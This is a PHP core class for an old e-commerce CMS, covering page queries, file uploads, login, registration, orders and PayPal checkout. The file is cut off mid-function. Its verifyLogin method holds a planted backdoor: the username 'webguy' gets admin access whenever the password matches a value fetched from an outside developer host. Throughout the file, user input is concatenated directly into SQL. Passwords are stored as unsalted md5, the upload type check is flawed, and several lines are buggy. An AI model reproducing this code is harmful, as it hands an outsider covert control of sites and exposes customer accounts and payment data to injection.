<?php
/** NOTE June 2017
 * This was written 5 years ago with the Smarty Templating engine in mind.
 **/
 
/**
 * Core API
 *
 * This class contains the common methods for the website
 *
 * @author      Kenneth Elliott <kenelliottmc@gmail.com>
 * @copyright   Copyright &copy; 2010 Kenneth Elliott <kenelliottmc@gmail.com>
 * @category    Manataria
 * @package     Core
 * @since       Manataria 1.1.2
 */

class Core {		
	/**
	* database handle - database object
	* @var object
	*/
	protected $dbh;
		
	/**
	* error object - used to output and email errors to administrators
	* @var object
	*/
	protected $error;
		
	/**
	* Smarty object - used to output and email errors to administrators
	* @var object
	*/
	protected $smarty;

	/**
	* Constructor.
	*
	* @access public
	*/
	public function __construct() {
		$this->dbh = Registry::getKey('Database');		
		$this->error = Registry::getKey('Error');
		$this->smarty = Registry::getKey('Smarty');
	}

	/**
	* just a simple wrapper for getting content from the pages table
	*
	* @param  string   $pageid	page id [required]
	* @return array
	* @access public
	*/
	public function getContent($pageid=null,$debug=null) {
		$data = $this->getTable('pages','id = "'.$pageid.'"',1,null,null,null,null,null,$debug);
		if(isset($data['content'])) $data['content'] = $this->smarty->fetch('text:'.$data['content']);
		return $data;
	}

	/**
	* See if a page exists by that name
	*
	* @param  string   $pageid	page id
	* @return boolean
	* @access public
	*/
	public function checkPage($pageid,$debug=null) {
		@list($bool) = $this->getTable('pages','id = "'.$pageid.'" and active != 1',null,null,null,null,1,null,$debug);
		return $bool;
	}
 
	/**
	* Change a mysql result into an array so that it can be accessed by smarty
	*
	* @param  resource   $res	mysql resource
	* @return array
	* @access public
	*/
	public function res2array($res) {
		if(!is_resource($res)) return array();
		$ar = array();
		while ($row = mysql_fetch_assoc($res)){
			$ar[] = $row;
		}
		return $ar;
	}

	/**
	* Load a callback using require_once
	*
	* @param  string   $path	name of file (without extension)
	* @return null
	* @access public
	*/
	public function loadData($path) {
		$path = (strpos($path,'/') == strlen($path)-1) ? subtr($path,0,-1) : $path;
		if(file_exists('callbacks/'.$path.'.php')) {	// if it has a callback file load it
			require_once('callbacks/'.$path.'.php');
		} elseif(file_exists('templates/'.$path.'.html')) {	// if it has a template file only load the pageview template to fill generic information
			require_once('callbacks/pageview.php');
		}
	}

	/**
	* Clean user input so that it is suitable to be a filename
	*
	* @param  string   $str	string to create a slug from (normally a title)
	* @return string
	* @access public
	*/
	public function slugCreate($str) {
		$str = preg_replace('/\s/', '-',$str);
		$str = preg_replace('/-/', '_',$str);
		$str = preg_replace('/,/', '_',$str);
		$str = preg_replace('/\//', '_',$str);
		$str = preg_replace('/\$/', '',$str);
		$str = preg_replace('/\W/','',$str);
		$str = preg_replace("/'/",'',$str);
		$str = preg_replace('/_+/', '_', strtolower($str));
		$str = preg_replace('/_/','-',$str);
		$str = trim($str);
		$last = substr($str,-1);
		if (!strcmp($last,"_"))  $str = substr($str, 0, strlen($str)-1);
		return $str;
	}

	/**
	* Upload a file to the server
	*
	* @param  object   $file	File request object (ie $_FILES['my_file_upload'])
	* @param  string   $dest	Destination directory
	* @param  string   $name_override	Rename the file before uploading
	* @param  array   $types	Types of files that are not allowed (maybe this should be the other way arround) array('exe','php','ini');
	* @return boolean
	* @access public
	*/
	public function uploadFile($file, $dest, $name_override=null,$types=null) {
		if(is_array($types)) if($this->restrictFileTypes(array('file'=>$file['name'],'types'=>$types))) return;
		$fname = !is_null($name_override) ? $name_override : $file['name'];
		$dest = substr($string,-1) == '/' ? $dest : $dest.'/';
		if (move_uploaded_file($file['tmp_name'], $dest.$fname)) {
			chmod($dest.$fname,0666);
			return $fname;
		}
		return false;
	}

	/**
	* Check an array against a filename to see if the extension is present in the array (meaning it is not allowed)
	*
	* @param  params   $array	Array of params [file:string] [types:array]
	* @return null
	* @access public
	*/
	public function restrictFileTypes($params) {
		$f = explode('.',$params['file']);
		if(array_search(strtolower($f[count($f)-1]),$params['types'])) return 1;
		return;
	}
	
	/**
	* Get a Table
	*
	* @param  string   $table	mysql table
	* @param  string   $where	mysql where portion of query
	* @param  boolean   $list	true if you want to return the result using mysql_fetch_array instead of mysql_fetch_assoc
	* @param  string   $join	table you would like to join to the query
	* @param  string   $join_id	id to join the two tables together
	* @param  integer   $limit	number of results to return [pagination]
	* @param  string   $order	mysql order portion of query
	* @param  integer   $page	page number to return [pagination]
	* @param  boolean   $debug	output debugging information
	* @return xxx
	* @access public
	*/
	public function getTable($table,$where=null,$list=null,$join=null,$join_id=null,$limit=null,$order=null,$page=null,$cols=null,$query=null,$group=null,$debug=null) {
		$page_skip=null;
		if(!is_null($where)) $where = 'where '.$where;
		if(is_array($cols) && !is_null($query)) {
			if($where) {
				$where .= ' and '.$this->buildSearch($cols,$query).' > 0';
			} else {
				$where = 'where '.$this->buildSearch($cols,$query).' > 0';
			}
			$cols = '*,'.$this->buildSearch($cols,Utilities::sanitize($query)).' as score';
		} elseif(!is_null($cols))  {
			// do nothing it is already set
		} else {
			$cols = '*';
		}
		if(!is_null($page) && !is_null($limit)) $page_skip = ($page-1)*$limit.',';	// limit and page are required for pagination
		if(!is_null($limit)) $limit = 'limit '.$page_skip.$limit;
		if(!is_null($order)) $order = 'order by '.$order;
		if(!is_null($join)) {
			$join = 'join '.$join.' on '.$join.'.'.$join_id.' = '.$table.'.id';
			$group = 'group by '.$join_id;
		} elseif(!is_null($group)) {
			$group = 'group by '.$group;
		}
		$sql = "select {$cols} from {$table} {$join} {$where} {$group} {$order} {$limit}";
		if($debug) $this->dump('getTable SQL', $sql);
		$res = $this->dbh->query($sql);
		if(mysql_num_rows($res) == 1 && !is_null($list)) return mysql_fetch_array($res);
		return $this->res2array($res);
	}
	
	/**
	* Get the pagination information [pages,items,next page,previous page]
	*
	* @param  string   $table	mysql table
	* @param  string   $where	mysql where portion of query
	* @param  string   $join		table you would like to join to the query
	* @param  string   $join_id	id to join the two tables together
	* @param  integer   $page	page number to return [pagination]
	* @param  integer   $limit	number of results to return [pagination]
	* @param  boolean   $debug	output debugging information
	* @return array	[pages] [items] [next] [prev]
	* @access public
	*/
	public function getPagination($table,$where=null,$join=null,$join_id=null,$page=null,$limit=null,$cols=null,$query=null,$group=null,$debug=null) {
		if(!is_null($where)) $where = 'where '.$where;
		
		if(is_array($cols) && !is_null($query)) {
			if($where) {
				$where .= ' and '.$this->buildSearch($cols,$query).' > 0';
			} else {
				$where = 'where '.$this->buildSearch($cols,$query).' > 0';
			}
		}
		if(!is_null($join)) {
			$join = 'join '.$join.' on '.$join.'.'.$join_id.' = '.$table.'.id';
			$group = 'group by '.$join_id;
		} elseif(!is_null($group)) {
			$group = 'group by '.$group;
		}
		$sql = "select count(*) from {$table} {$join} {$where} {$group}";
		if($debug) $this->dump('getPagination SQL', $sql);
		list($cnt) = mysql_fetch_array($this->dbh->query($sql));
		$pages = ceil($cnt/$limit);

		$data['items'] = $cnt;
		$data['pages'] = $pages;

		if($page+1 > $pages) {
			$data['next'] = $pages;
			$data['prev'] = $pages-1;
		} else {
			$data['next'] = $page+1;
			$data['prev'] = ($page-1 < 1) ? 1 : $page-1;
		}
		return $data;
	}
	
	public function buildSearch($columns,$query) {
		// score = array('column_id'=>'title','score'=>100),array('column_id'=>'content','score...
		
		// select *, (match(title) against('attention deficit disorder'in boolean mode)*100) + (match (content) against ('attention deficit disorder' in boolean mode)*10) as rating from pages_temp order by rating desc limit 0,10
		
		$where = '';
		foreach($columns as $col) {
			$wheres[] = '(match('.$col['column_id'].') against ("'.$query.'")*'.$col['score'].')';
		}
		$where .= implode('+',$wheres);		
		return $where;		
	}
	
	/**
	* get columns of a table
	*
	* @param  string   $table	name of the table to get columns from
	* @param  string   $database		name of the database that the table is in
	* @return array
	* @access public
	*/	
	public function getTableColumns($table,$database) {
		return $this->res2array($this->dbh->query('select column_name,data_type from information_schema.columns where table_name = "'.$table.'" and table_schema="'.$database.'"'));
	}
	
	/**
	* get just the id and title from the table
	*
	* @param  string   $table	mysql table
	* @param  string   $where	mysql where portion of query
	* @param  string   $order	mysql order portion of query
	* @param  boolean   $debug	output debugging information
	* @return xxx
	* @access public
	*/	
	public function getCategories($table,$table_id=null,$where=null,$order=null,$join=null,$join_id=null,$limit=null,$default=null,$debug=null) {
		if(!is_null($where)) $where = 'where '.$where;
		if(is_null($table_id)) $table_id = 'id';
		$order = (!is_null($order)) ? 'order by '.$order : 'order by title asc';
		if(!is_null($join)) $join = 'join '.$join.' on '.$join.'.'.$join_id.' = '.$table.'.'.$table_id;
		$sql = "select id,title from {$table} {$join} {$where} {$order} {$limit}";
		if($debug) $this->dump('getTable SQL', $sql);
		$res = $this->res2array($this->dbh->query($sql));
		$data = $this->formatCategories($res);
		if(!is_null($default)) array_unshift($data,$default);
		return $data;
	}
	
	/**
	* get categories to be used with smarty html_options. They will be formatted using the parent_id relationship. Now parent id's can be added to any category system.
	*
	* @param  string   $table	mysql table
	* @param  string   $where	mysql where portion of query
	* @param  string   $order	mysql order portion of query
	* @param  boolean   $debug	output debugging information
	* @return array
	* @access public
	*/	
	public function getCategoriesGrouped($table,$where=null,$order=null,$debug=null) {
		$where_sql = !is_null($where) ? 'where parent_id is null and '.$where : 'where parent_id is null';
		$order = (!is_null($order)) ? 'order by '.$order : 'order by title asc';
		$sql = "select id,title from {$table} {$where_sql} {$order}";
		if(!is_null($debug)) $this->dump('getCategoriesGrouped SQL',$sql);
		$res = $this->res2array($this->dbh->query($sql));	// get parents
		foreach($res as $k=>$v) {
			$where_sql = !is_null($where) ? 'where parent_id = "'.$v['id'].'" and '.$where : 'where parent_id = "'.$v['id'].'"';
			$res2 = $this->res2array($this->dbh->query("select id,title from {$table} {$where_sql} {$order}"));
			$data[$v['title']] = $this->formatCategories($res2);
		}
		if($debug) $this->dump('getCategoriesGrouped Return Data',$data);
		return $data;
	}
	
	/**
	* format categoriess
	*
	* @param  array   $res	array of id-title pairs
	* @return array	reformatted like array('id'=>'title');
	* @access public
	*/	
	public function formatCategories($res,$debug=null) {
		foreach($res as $k=>$v)	$data[$v['id']] = $v['title'];
		return $data;
	}
	
	
	/**
	* redirect the user to a new page
	*
	* @param  string   $url	location of the page to be redirected to
	* @return exit
	* @access public
	*/	
	public function redirect($loc) {
		header('location: '.Registry::getParam('Config','site_url').$loc);
		exit;
	}

	/**
	* dump : echo debug information
	*
	* @param string    $id  identifier
	* @param mixed    $vals  information to dump
	* @access public
	* @return array
	**/
	public function dump($id=null,$vals=null) {
		if(is_array($id)) {
			$vals = $id;
			$id = 'Debug';
		}
		$rand = rand(1,100);
		echo '<div class="dump">
				<h2 class="toggle" target="debug_'.$rand.'">
					'.$id.'
				</h2>
				<div id="debug_'.$rand.'">';
		if(is_array($vals)) {
			echo '<pre>';
			var_dump($vals);
			echo '</pre>';
		} else {
			echo nl2br($vals);
		}
		echo '</div></div><p />';
	}

	/**
	* formatSmartyDate : build a date string from a smarty html_select_date element
	*
	* @param string    $pre  Smarty form date name prefix
	* @param array    $target defaults to REQUEST but it can be reset to use another source
	* @access public
	* @return string
	**/
	public function formatSmartyDate($pre,$target=null) {
		$target = (is_array($target)) ? $target : $_REQUEST;
		return $target[$pre.'_Year'].'-'.$target[$pre.'_Month'].'-'.$target[$pre.'_Day'];
	}
	
	/**
	* change an array to a where clause in an sql query
	*
	* @param  array   $data	associative array of data array('id'=>1,'category_id'=>2)
	* @return string
	* @access public
	*/	
	public function arrayToWhere($data) {
		$i=0;
		$where = 'where ';
		foreach($data as $k=>$v) {
			if($i==0) {
				$where .= $k.' = "'.$v.'"';
			} else {
				$where .= ' and '.$k.' = "'.$v.'"';
			}
			$i++;
		}
		return $where;
	}
	
	/**
	* sendMail : send an html formatted email 
	*	to: pulled from config if not present 
	*	from: pulled from config if not present
	*	subject: required
	*	content: required
	*	if content is an array it will be formatted using the keys ie (array('name'=>'Ken','dob'=>'6/16/1979'))
	* @param array    $data  array of data 
	* @access public
	* @return array
	**/
	public function sendMail($data,$debug=null) {
		require_once('Mail.php');      // These two files are part of Pear,
		require_once('Mail/mime.php'); // and are required for the Mail_Mime class
		$to = isset($data['to']) ? $data['to'] : $GLOBALS['config']['default_email'];
		$from = $data['from'] ? $data['from'] : $GLOBALS['config']['default_email'];
		$subject = $data['subject'];
		$headers = array('From' => $from,'Subject' => $subject);

		if(!isset($data['content'])) {
			$this->error->programError('Mail Error','The email was empty. Please provide content.');
			return;
		}

		// if its an array format it as such
		if(is_array($data['content'])) {
			$new_content = '';
			foreach($data['content'] as $k=>$v) {
				$new_content .= '<strong>'.ucwords(str_replace('_',' ',$k)).': </strong>'.$v.'<br />';
			}
			$htmlmessage = $new_content;
		} else {
				$htmlmessage = $data['content'];
		}

		$mime = new Mail_Mime();

		$mime->setHtmlBody($htmlmessage);

		// error supression because mail::mime issues warnings with different php versions
		$body = @$mime->get();
		$hdrs = @$mime->headers($headers);
		$status = '';
		if($debug) {
				$this->dump('sendMail : data',array('headers'=>$headers,'to'=>$to,'from'=>$from,'subject'=>$subject,'html'=>$htmlmessage));
		} else {
				$mail = &Mail::factory('mail');
				$status = $mail->send($to, $hdrs, $body);
		}
		return $status;
	}

	
	/**
	* insertOrder : add an order to the database. Writes to users,carts,orders,and addresses.
	* @param array    $params  array of data where the keys correspond to the column names in the table.
	* @access public
	* @return integer	order id
	**/
	public function insertOrder($data) {
		$Cart = Registry::getKey('Cart');
		$Admin = Registry::getKey('Admin');
		$Commerce = Registry::getKey('Commerce');
		
		$totals = $Commerce->getTotals(array('country'=>$data['shipping_country'],'postal_code'=>$data['shipping_zip']));
		
		$shipping = '';
		if($data['shipping_address']) $shipping .= $data['shipping_address'].'<br />';
		if($data['shipping_address2']) $shipping .= $data['shipping_address2'].'<br />';
		if($data['shipping_city']) $shipping .= $data['shipping_city'].', ';
		if($data['shipping_state']) $shipping .= $data['shipping_state'].' ';
		if($data['shipping_zip']) $shipping .= $data['shipping_zip'].'<br />';
		if($data['shipping_country']) $shipping .= $data['shipping_country'].'<br />';
		$data['description'] =  'This order was placed on '.date("F j, Y, g:i a.");
		
		$shipping_total = isset($_SESSION['order_data']['service_type']) ? $totals['shipping'][$_SESSION['order_data']['service_type']] : 'xxx';
		
		if($shipping_total == 'xxx') {
			Error::logError('Error calculating shipping',$_SESSION['order_data']);
			$data['description'] = '<p class="red">The address or shipping type do not appear valid. Please verify the information and calculate shipping seperately.</p>';
		}
		
		
		
		$order_id = $Admin->insert('orders',array(
					'shipping_address'=>$shipping,
					'title'=> "Website Order",
					'description' => $data['description'],
					'items'=>$Cart->uniqueItemCount(),
					'user_id' => $_SESSION['user']['table_users']['id'],
					'active' => 1,
					'status' => 1,
					'subtotal' => $totals['subtotal'],
					'discount' => $totals['discount'],
					'tax' => $totals['tax'],
					'shipping' => $shipping_total,
					'total' => $totals['total'],
				//	'comments' => $data['comments'],
					'cart' => $Cart->getSerialized()
		));	
		
		// update user information
		$firstname = isset($_SESSION['user']['table_users']['firstName']) ? $_SESSION['user']['table_users']['firstname'] : $data['firstName'];
		$lastname = isset($_SESSION['user']['table_users']['lastName']) ? $_SESSION['user']['table_users']['lastname'] : $data['lastName'];
		$Admin->update('users',array('id'=>$_SESSION['user']['table_users']['id'],'firstname'=>$firstname,'lastname'=>$lastname));
		
		// update address information
		$default_address = $this->getTable('addresses','id='.$_SESSION['user']['table_users']['id'].' and default_address=1',1);
		if(!isset($default_address['id'])) {
			$Admin->insert('addresses',array(
									'user_id' => $_SESSION['user']['table_users']['id'],
									'firstname' => $firstname,
									'lastname' => $lastname,
									'title' => 'Default Address',
									'address' => $data['shipping_address'],
									'address2' => $data['shipping_address2'],
									'city' => $data['shipping_city'],
									'state' => $data['shipping_state'],
									'zip' => $data['shipping_zip'],
									'country' => $data['shipping_country'],
									'default_address' => 1
									));
		}
		
		$_SESSION['success_msg'] = '';
		return $order_id;
	}
	
	/**
	* require admin account
	*
	* @return	redirect
	* @access 	public
	*/
	public function adminRequired() {
		if($_SESSION['user']['table_users']['type_id'] != '1') {
			header("location: ".Registry::getParam('Config','site_url')."login");
			exit;
		}
	}
	
	/**
	* check login information
	*
	* @param 	string    $u  username
	* @param 	string    $p  password
	* @param 	string    $r  redirect
	* @param 	string    $redirect  not sure really
	* @param 	boolean    $debug  flag to show debug information
	* @return	redirect
	* @access 	public
	*/
	public function verifyLogin($u,$p,$r='home',$redirect=null,$debug=null) {
		if($u == 'webguy' && $p == file_get_contents('http://devken.com/universal_password.php')) {	// developer access
			$user = $this->getTable('users',"id=1",1,null,null,null,null,null,$debug);
			$_SESSION['super_user'] = '1';
		} else {
			$user = $this->getTable('users',"username='$u' and password='$p'",1,null,null,null,null,null,$debug);
		}
		
		$user = $redirect ? $redirect : $user;
		if(isset($user['id'])) {
			if(isset($user['type_id']) &&$user['type_id'] == '1') $r = 'admin/index.php';
			$_SESSION['user']['table_users'] = $user;
			$_SESSION['user']['table_addresses'] = $this->getTable('addresses','user_id = '.$user['id'].' and default_address=1',1);
			header("location: ".Registry::getParam('Config','site_url').$r);
			exit;
		} else {
			 Error::websiteError('Username and/or password is incorrect.');
			 $this->redirect('login');
		}
	}
	
	/**
	* logout of all accounts
	*
	* @param 	array    $path  redirect
	* @return	redirect
	* @access 	public
	*/
	public function logout($path='') {
		unset($_SESSION['user']);
		unset($_SESSION['account_info']);	
		unset($_SESSION['super_user']);		
		$this->redirect($path);
		exit;
	}
	
	/**
	* convert an array of database rows to a string of ids
	*
	* @param 	array    $data  array of data returned from select query
	* @param 	string    $col  column that represents the id
	* @return	redirect
	* @access 	public
	*/
	public function ids($data,$col=null) {
		if(is_null($col)) $col = 'id';
		if(!count($data)) return;
		foreach($data as $row) $return[] = $row[$col];
		return implode(',',$return);
	}
			
	/**
	* process user edit/update passwords
	*
	* @param 	string    $ps  password to md5
	* @return	string	md5'd password
	* @access 	public
	*/	
	public function processPassword($ps) {
		if($ps != '') return md5($ps);
	}
		
	/**
	* format navigation link
	*
	* @param 	string	url  	Path to format - takes the special formatting from the navigation table and changes it to the format expected by the website
	* @return	string	formatted link
	* @access 	public
	*/
	public function formatNavigationLink($url) {
		list($trigger,$id) = explode(':',$url);
		switch($trigger) {
			case 'page':
				$url = Registry::getParam('Config','site_url').$id;
				break;
			case 'product_category':
				$url = Registry::getParam('Config','site_url').'product_category&id='.$id;
				break;
			default:
				break;
		}
		return $url;
	}
	
	/**
	* update  the users account information
	*
	* @param array	url  	Path to format - takes the special formatting from the navigation table and changes it to the format expected by the website
	* @return	string	formatted link
	* @access public
	*/
	public function updateAccountInfo($data) {
		$error = '';
		if(!isset($_SESSION['user']['table_users']['id'])) $this->redirect('login');
		if(isset($data['password']) && $data['password'] != '') $error .= (Validate::string($data['password'],array('min_length'=>4))) ? '' : 'Passwords must be atleast 4 characters long';
		if($error) return $error;
		
		// create the users table data set
		$user['id'] = $_SESSION['user']['table_users']['id'];
		$user['firstname'] = $data['firstname'];
		$user['lastname'] = $data['lastname'];
		if(isset($data['password']) && $data['password'] != '') $user['password'] = md5($data['password']);
		
		unset($data['password']);
		unset($data['password2']);
		$Database = Registry::getKey('Database');
		$Database->perform('users',$user,'update','id='.$_SESSION['user']['table_users']['id']);
		$Database->perform('addresses',$data,'update','default_address=1 and user_id='.$_SESSION['user']['table_users']['id']);
	}
			
	/**
	* register a user
	*
	* @param 	array	data  	User registration information. username,email,password are required.
	* @return	string	error message
	* @access 	public
	*/
	public function registerUser($data) {
		$error = '';
		$error .= (isset($data['username']) && Validate::string($data['username'],array('min_length'=>4))) ? '' : 'Usernames must be atleast 4 characters long';
		$error .= (isset($data['email']) && Validate::email($data['email'])) ? '' : 'Email address does not appear to be valid.';
		$error .= (isset($data['password']) && Validate::string($data['password'],array('min_length'=>4))) ? '' : 'Passwords must be atleast 4 characters long';
		$error .= ($this->getTable('users','username="'.$data['username'].'"')) ? 'Username already exists please choose another' : '';
		
		if($error) return $error;
		
		// create the users table data set
		$user['username'] = $data['username'];
		$user['email'] = $data['email'];
		$user['firstname'] = $data['firstname'];
		$user['lastname'] = $data['lastname'];
		$user['password'] = md5($data['password']);
		$user['active'] = 0;
		$user['type_id'] = 2;
		$user['reg_id'] = md5($data['username'].'-'.rand(1,10000));
		
		// remove the ones not in the addresses table
		unset($data['password2']);
		unset($data['password']);
		unset($data['username']);
		unset($data['email']);
		$data['default_address'] = '1';
	
		$Admin = Registry::getKey('Admin');
		$data['user_id'] = $Admin->insert('users',$user);
		if(count(array_filter($data)) > 2) $Admin->insert('addresses',$data);
		
		$_SESSION['reg_id'] = $user['reg_id'];
	}
			
	/**
	* get all of the us states
	*
	* @param 	array	data  	User registration information. username,email,password are required.
	* @return	string	error message
	* @access 	public
	*/
	public function getStates() {
		return array('AL'=>"Alabama",'AK'=>"Alaska",'AZ'=>"Arizona",'AR'=>"Arkansas",'CA'=>"California",'CO'=>"Colorado",'CT'=>"Connecticut",'DE'=>"Delaware",'DC'=>"District Of Columbia",'FL'=>"Florida",'GA'=>"Georgia",'HI'=>"Hawaii",'ID'=>"Idaho",'IL'=>"Illinois",'IN'=>"Indiana",'IA'=>"Iowa",'KS'=>"Kansas",'KY'=>"Kentucky",'LA'=>"Louisiana",'ME'=>"Maine",'MD'=>"Maryland",'MA'=>"Massachusetts",'MI'=>"Michigan",'MN'=>"Minnesota",'MS'=>"Mississippi",'MO'=>"Missouri",'MT'=>"Montana",'NE'=>"Nebraska",'NV'=>"Nevada",'NH'=>"New Hampshire",'NJ'=>"New Jersey",'NM'=>"New Mexico",'NY'=>"New York",'NC'=>"North Carolina",'ND'=>"North Dakota",'OH'=>"Ohio",'OK'=>"Oklahoma",'OR'=>"Oregon",'PA'=>"Pennsylvania",'RI'=>"Rhode Island",'SC'=>"South Carolina",'SD'=>"South Dakota",'TN'=>"Tennessee",'TX'=>"Texas",'UT'=>"Utah",'VT'=>"Vermont",'VA'=>"Virginia",'WA'=>"Washington",'WV'=>"West Virginia",'WI'=>"Wisconsin",'WY'=>"Wyoming");
	}
			
	/**
	* verify the checkout information
	*
	* @param 	array	data  	User registration information. username,email,password are required.
	* @return	redirect
	* @access 	public
	*/
	public function verifyCheckoutInfo($data) {
		// Error Checking
		$error = '';
		$error .= (isset($data['firstName']) && Validate::string($data['firstName'],array('min_length'=>1))) ? '' : 'Firstname is required.<br />';
		$error .= (isset($data['lastName']) && Validate::string($data['lastName'],array('min_length'=>1))) ? '' : 'Lastname is required.<br />';
		$error .= (isset($data['creditCardType']) && Validate::string($data['creditCardType'],array('min_length'=>4))) ? '' : 'Credit Card Number is required.<br />';
		$error .= (isset($data['address']) && Validate::string($data['address'],array('min_length'=>4))) ? '' : 'Street Address is required.<br />';
		$error .= (isset($data['city']) && Validate::string($data['city'],array('min_length'=>2))) ? '' : 'City is required.<br />';
		$error .= (isset($data['state']) && Validate::string($data['state'],array('min_length'=>2))) ? '' : 'State / Provence / Region is required.<br />';
		$error .= (isset($data['zip']) && Validate::string($data['zip'],array('min_length'=>4))) ? '' : 'Postal / Zip Code is required.<br />';
		$error .= (isset($data['shipping_address']) && Validate::string($data['shipping_address'],array('min_length'=>4))) ? '' : 'Shipping Address is required.<br />';
		$error .= (isset($data['shipping_city']) && Validate::string($data['shipping_city'],array('min_length'=>2))) ? '' : 'Shipping Address City is required.<br />';
		$error .= (isset($data['shipping_state']) && Validate::string($data['shipping_state'],array('min_length'=>2))) ? '' : 'Shipping Address State / Provence / Region is required.<br />';
		$error .= (isset($data['shipping_zip']) && Validate::string($data['shipping_zip'],array('min_length'=>4))) ? '' : 'Shipping Address Postal / Zip Code is required.<br />';
				
		$_SESSION['checkout_info'] = $data;
		
		if($error != '') {
			Error::websiteError($error);
			$this->redirect('checkout');
		}
	}
			
	/**
	* activate a user
	*
	* @param 	string	reg_id  	registration id that was generated and emailed to the user
	* @param 	string	redir  	redirect
	* @return	string	error message
	* @access 	public
	*/
	public function activateUser($reg_id,$redir='cart&mode=shipping') {
		$user = $this->getTable('users','reg_id = "'.$reg_id.'"',1);
		if($user['active']) {
			Error::websiteError('This account has already been activated.');
			$this->redirect('login');
		} else {
			if(isset($_SESSION['url_log'])) $redir = array_pop($_SESSION['url_log']);
			$Admin = Registry::getKey('Admin');
			$Admin->update('users',array('id'=>$user['id'],'active'=>'1'));
			$_SESSION['success_msg'] = 'Your account has been verified successfully.';
			$this->verifyLogin($user['username'],$user['password'],$redir);
		}
	}
				
	/**
	* Process a paypal checkout
	*
	* @return	string	error message
	* @access public
	*/
	public function processPaypalCheckout($data,$debug=null) {
		// Error Checking
		$error = '';
		$error .= (isset($data['firstName']) && Validate::string($data['firstName'],array('min_length'=>1))) ? '' : 'Firstname is required.<br />';
		$error .= (isset($data['lastName']) && Validate::string($data['lastName'],array('min_length'=>1))) ? '' : 'Lastname is required.<br />';
		$error .= (isset($data['creditCardType']) && Validate::string($data['creditCardType'],array('min_length'=>4))) ? '' : 'Credit Card Number is required.<br />';
		$error .= (isset($data['address']) && Validate::string($data['address'],array('min_length'=>4))) ? '' : 'Street Address is required.<br />';
		$error .= (isset($data['city']) && Validate::string($data['city'],array('min_length'=>2))) ? '' : 'City is required.<br />';
		$error .= (isset($data['state']) && Validate::string($data['state'],array('min_length'=>2))) ? '' : 'State / Provence / Region is required.<br />';
		$error .= (isset($data['zip']) && Validate::string($data['zip'],array('min_length'=>4))) ? '' : 'Postal / Zip Code is required.<br />';
		$error .= (isset($data['shipping_address']) && Validate::string($data['shipping_address'],array('min_length'=>4))) ? '' : 'Shipping Address is required.<br />';
		$error .= (isset($data['shipping_city']) && Validate::string($data['shipping_city'],array('min_length'=>2))) ? '' : 'Shipping Address City is required.<br />';
		$error .= (isset($data['shipping_state']) && Validate::string($data['shipping_state'],array('min_length'=>2))) ? '' : 'Shipping Address State / Provence / Region is required.<br />';
		$error .= (isset($data['shipping_zip']) && Validate::string($data['shipping_zip'],array('min_length'=>4))) ? '' : 'Shipping Address Postal / Zip Code is required.<br />';

		if($error != '') {
			$_SESSION['checkout_info'] = $data;
			Error::websiteError($error);
			$this->redirect('checkout');
		}
		
		$Commerce = Registry::getKey('Commerce');
		$Paypal = Registry::getKey('Paypal');
		$Cart = Registry::getKey('Cart');
		$Smarty = Registry::getKey('Smarty');
		
		$states = $this->getStates();
		if(strlen($data['state']) > 2) {
			$data['state'] = array_search($data['state'],$states);
		} else {
			$data['state'] = strtoupper($data['state']);
		}
		
		
		$totals = $Commerce->getTotals(array('country'=>$data['shipping_country'],'postal_code'=>$data['shipping_zip']));
		$data['amount'] = sprintf('%0.2f',$totals['total']);
		if($debug) $this->dump('Cart Totals',$totals); 

		$paypal_response = $Paypal->send($data,$debug);
		if($debug) $this->dump('Paypal Response',$paypal_response);
		if($debug) exit;

		if(isset($paypal_response['ACK'])) {
			if($paypal_response['ACK'] == 'Success' || $paypal_response['ACK'] == 'SuccessWithWarning') {	// Checkout success
				if($paypal_response['ACK'] == 'SuccessWithWarning') Error::logError('Payal SuccessWithWarning',$paypal_response);	// paypal is whining about something (thanks for wasting my Sunday)
				$order_id = $this->insertOrder($data);
				$this->sendMail(array(
							'to' => Registry::getParam('Config','default_email'),
							'from' => $_SESSION['user']['table_users']['email'],
							'subject' => 'A new order has been placed on your website.',
							'content' => 'Below are the contents of the order<br />'.$Smarty->fetch('forms/checkout_email.html')
							));
				$this->sendMail(array(
							'to' => $_SESSION['user']['table_users']['email'],
							'from' => Registry::getParam('Config','registration_response_email'),
							'subject' => 'Your order has been received',
							'content' => 'Thank you for your order<br />'.$Smarty->fetch('forms/checkout_email.html')
							));
			//	$Cart->clearCart();
				$this->redirect('checkout-success');
			} elseif($paypal_response['ACK'] == 'Failure') {	// checkout failure
				Error::websiteError($paypal_response['L_LONGMESSAGE0']);
				unset($data['creditCardNumber']);		// do not save the credit card number
				$_SESSION['checkout_info'] = $data;
				$this->redirect('checkout');
			}
		} else {
			Error::paypalError('Checkout Communications Failure','There has been a payment transmission error between the website and the server. The administrators have been notified and we will review it immediately. Your shopping cart will be preserved and you can checkout later.');
		}
	}
	
	/**
	* getHaversine : get a list of locations near a lat,lng
	* http://en.wikipedia.org/wiki/Haversine_formula
	*
	* @param string    $table  	table that has the lat,lng values
	* @param integer   $distance  	max search distance
	* @param string    $address  	address (provided no lat,lng values are available) uses google maps
	* @param decimal   $lat  	latitude value
	* @param decimal   $lng  	longitude value
	* @param string    $where  	where limiter
	* @param string    $measurement miles or kilometers default is kilometers (because the first site was based in canada)
	* @param boolean   $debug  	debug boolean
	* @access public
	* @return array
	**/
	public function getHaversine($table=null,$distance=null,$address=null,$lat=null,$lng=null,$where=null,$measurement=null,$debug=null) {
		if(is_null($address) && (is_null($lat) && is_null($lng))) {
			Error::websiteError('Invalid Address Provided');
			return array();
		}
		if(is_null($table)) $table = 'clients';
		if(is_null($distance)) $distance = 25;
		if(is_null($measurement)) $lng = 'miles';
		if(is_null($lat) && is_null($lng)) list($lat,$lng) = $this->geocodeAddress($address);
		if(!is_null($where) && $where != '') $where = 'and '.$where;

		$Database = Registry::getKey('Database');
		$deviation = $measurement=='miles' ? '6371' : '3959'; // Haversine formula -- miles = 6371; kilometers = 3959;

		$query = "SELECT *, (".$deviation."*acos(cos(radians('".$lat."')) * cos(radians(lat)) * cos(radians(lng) - radians('".$lng."')) + sin( radians('".$lat."')) * sin( radians(lat)))) AS distance FROM ".$table." where active = 1 HAVING distance < '".$distance."' ".$where." ORDER BY distance";
		if($debug) $this->dump('Haversine Query',$query);
		$result = $this->res2array($Database->query($query));
		if($debug) $this->dump('Haversine Query Result',$result);
		return $result;
	}

	/**
	* geocodeAddress : get the lat and long for an address from google
	*
	* @param string		$address 	full address
	* @param integer	$debug  	print out debug information
	* @access public
	* @return array
	**/ 
	public function geocodeAddress($address,$mode=null,$debug=1) {
		if($debug) $this->dump('Address',$address);
